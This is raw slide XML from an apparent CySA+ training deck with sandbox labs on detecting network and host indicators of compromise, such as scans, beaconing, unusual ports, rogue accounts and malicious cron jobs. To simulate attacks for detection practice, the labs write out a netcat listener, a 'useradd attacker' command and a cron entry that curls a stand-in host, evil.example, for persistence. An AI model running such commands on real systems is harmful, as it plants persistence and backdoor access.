        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ tcpdump -i any -nn 'tcp[tcpflags] &amp; (tcp-syn) != 0 and not tcp[tcpflags]</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Detect beaconing (regular C2 callbacks)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Beaconing is malware checking in with its command-and-control server on a regular cadence.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ for i in {1..6}; do curl -s -o /dev/null http://example.com; sleep 5; do</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Detect activity on an unexpected port</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Spawn a listener on an unusual port:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ nc -l -p 31337 &amp;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Detect a traffic spike (bandwidth consumption)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Generate a burst of traffic:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ for i in {1..100}; do curl -s -o /dev/null http://example.com &amp; done; wa</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285</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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4 — Hands-On Steps (cont'd)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21534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1534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05840" y="263118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2631186"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Detect irregular peer-to-peer / rogue device patterns</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>ARP sweeps reveal rogue devices and lateral-movement reconnaissance:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2585466"/>
            <a:ext cx="3977639" cy="5486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52360" y="2585466"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ip neigh</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="21534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4064508"/>
            <a:ext cx="91440" cy="21534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005840" y="4912614"/>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4912614"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="5486400" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Clean up background jobs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4866894"/>
            <a:ext cx="3977639" cy="5486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52360" y="4866894"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ kill %1 %2 2&gt;/dev/null; jobs</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286</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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4 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  BPF filters for SYN-only packets → detecting scans.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Using tcpdump -ttt to spot beaconing intervals.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Identifying activity on unexpected ports with ss.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Recognising bandwidth spikes and ARP-based rogue device indicators.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287</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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5 — Host-Based IOC Hunting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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will hunt host-level indicators of compromise: unauthorised processes, unauthorised scheduled tasks, new accounts, file-system anomalies, and abnormal CPU/memory consumption. These are exam-blueprint items under CySA+ 1.2 (Host-related, Application-related, and Other indicators).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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288</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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5 — Reference Diagram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g_ac16252bcf.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2087923" y="1783080"/>
            <a:ext cx="8013106" cy="4434840"/>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289</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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5 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y auditd procps psmisc inotify-tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Baseline current state</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>You cannot spot the abnormal without first knowing the normal.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ps -ef &gt; /tmp/baseline_ps.txt</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Simulate unauthorised user creation (Application-related: "Introduction of new accounts")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The diff immediately surfaces the unauthorised account.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ useradd -m attacker</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Detect a malicious scheduled task (Host-related: "Unauthorized scheduled tasks")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>This is exactly what a persistence-stage attacker does.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ (crontab -l 2&gt;/dev/null; echo "*/5 * * * * curl -s http://evil.example/x</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
